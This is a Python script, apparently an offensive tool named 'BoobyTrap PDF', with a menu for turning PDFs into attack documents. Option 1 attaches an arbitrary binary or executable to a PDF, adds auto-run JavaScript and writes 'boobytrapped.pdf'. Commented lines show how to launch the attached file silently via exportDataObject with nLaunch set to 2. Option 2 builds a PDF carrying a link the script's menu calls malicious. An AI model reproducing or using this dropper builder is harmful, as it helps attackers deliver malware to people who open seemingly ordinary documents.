import PyPDF4
import os
from fpdf import FPDF

# Print Banner

print("")
print("================================================================================")
print("|>                                                                            <|")
print("|>                                           ▄▄▄▓████████▓▄                   <|")
print("|>                                      ▄▄▓████████████████▓                  <|")
print("|>                                  ▄▓███████████████████████                 <|")
print("|>                              ▄▓████████████████████████████                <|")
print("|>                           ▄█████████████████████████████████               <|")
print("|>                        ▄▓██████████████████████▀███████████▀               <|")
print("|>                      ▄████████████████████████▌   ▀██████▀▓█▌              <|")
print("|>                    ▓███████████████▀▀█████████    █▓████▀███               <|")
print("|>                  ▓████████████████▌    ▀▀████    █████▄▄██                 <|")
print("|>               ▓██████████████████              ███████▀██                  <|")
print("|>              ▄███████████▌  ▀█████          ▓▓▓▄████▀██                    <|")
print("|>             ▓████████████       ▀▌         ▀████▌▀                         <|")
print("|>           ▄██████████████              ▄▄▓████▒█▌ ▓▓▓▓▄▓██▓ ▓██            <|")
print("|>         ▄████████   ▀▀██        ▄▄▓████▀▀ █▓███▀▀ ▀█████████████▄██        <|")
print("|>        ▓█████████         ▄▄▓████▀▀        ▀▀▀       ▀▀████████▌▌██▄       <|")
print("|>      ▄▄▓█▀███ ▀██▌   ▄▄▓████▀▀                            ▀█████▓█▓▀█▄     <|")
print("|>    ,██▀▀██▄╨  ▄▄▄▄████▀▀                               ▓▄   ▀██▒██▀█▄▒     <|")
print("|>    ▐▌▓██▓██▒████▀▄                           ▄▄       ▓███▄    ▓██████     <|")
print("|>    ▐▌████▐█Ü▌   ███     ▄██▄      ▄██▄      ▓███▄    ▐██████▄ ▐███████     <|")
print("|>     ▀▓██▓██╫████████▄ ▄█████▓    ▓████▓    ███████▄  █████████████████     <|")
print("|>       ╙▀▀    ▀████████████████▄▄████████▄╒██████████▓█████████████████▌    <|")
print("|>                  ▀███████████████████████████████████████████████████▀     <|")
print("|>                      ▀▀███████████████████████████████████████████▀        <|")
print("|>                             ▀▀██████████████████████████████▀▀             <|")
print("|>                                       ▀▀▀▀▀▀▀▀▀▀▀▀                         <|")
print("|>============================================================================<|")
print("|>                  _                ___              _   _   _               <|")
print("|>                 |_)  _   _  |_     | _  _   _     |_) | \ |_               <|")
print("|>                 |_) (_) (_) |_) \/ | | (_| [_)  ~ |   |_/ |                <|")
print("|>                                 /          |                               <|")
print("|>============================================================================<|")
print("|>=============================================================EdgarMedina====<|")
print(                                   "Pick your poison: \n")
print(                 "[ 1 ] Incrust a binary, executable or file hidden in a PDF.\n")
print(                 "[ 2 ] Generate a PDF with a malicious link embed.\n\n")
print(                 "[ 3 ] Quit\n")
choice = input("            \nEnter choice =====> ")

if(choice == "1"):
    binary = input("Path to the binary file to embed ==========> ")
    pdfFile = input("Path to the PDF to be embed ===============> ")
    # opening the first pdf
    reader = PyPDF4.PdfFileReader(pdfFile)
    writer = PyPDF4.PdfFileWriter()
    print(f"original PDF size: {os.stat(pdfFile).st_size}")

    # copying the sample.pdf to a new writer
    writer.appendPagesFromReader(reader)
    print(f"binary size: {os.stat(binary).st_size}")

    # starts print job, testing for js execution
    writer.addJS("this.print({bUI:true,bSilent:false,bShrinkToFit:true});")
    # opening and embedding the binary into pdf
    with open(binary, "rb") as rs:
        writer.addAttachment(binary, rs.read())
        #writer.addJS("this.exportDataObject({cName: 'binary', nLaunch: 2});")
    # adding JavaScript that will invoke the binary
    # nLaunch: 2 --> without prompting the user and saving it to a temp location
    # does not inside FoxitPdf reader since it block the execution
    #javascript = """this.exportDataObject({cName: 'binary' + '.Settingcontent-ms', nLaunch: 2});"""
    # writing to the new pdf that contains the attachment( binary )

    with open("boobytrapped.pdf", "wb") as f:
        writer.write(f)
    print(f"size of boobytrapped pdf: {os.stat('boobytrapped.pdf').st_size}")
    print("Binary added to boobytrapped.pdf")

elif(choice == "2"):
    link = input("Enter the link to be embbeded --> ")
    pdf = FPDF()

    pdf.add_page()
    pdf.set_font("Courier", size = 15)
    pdf.cell(200, 10, txt = "Booby-Trap",
            ln = 1, align = 'C')
    pdf.cell(200, 10, txt = link, border = 1,
            ln = 2, align = 'C')
    pdf.output("BoobyLinked.pdf")   
elif(choice == "3"):
    exit
else:
        print(  " Invalid option. Please try again.")
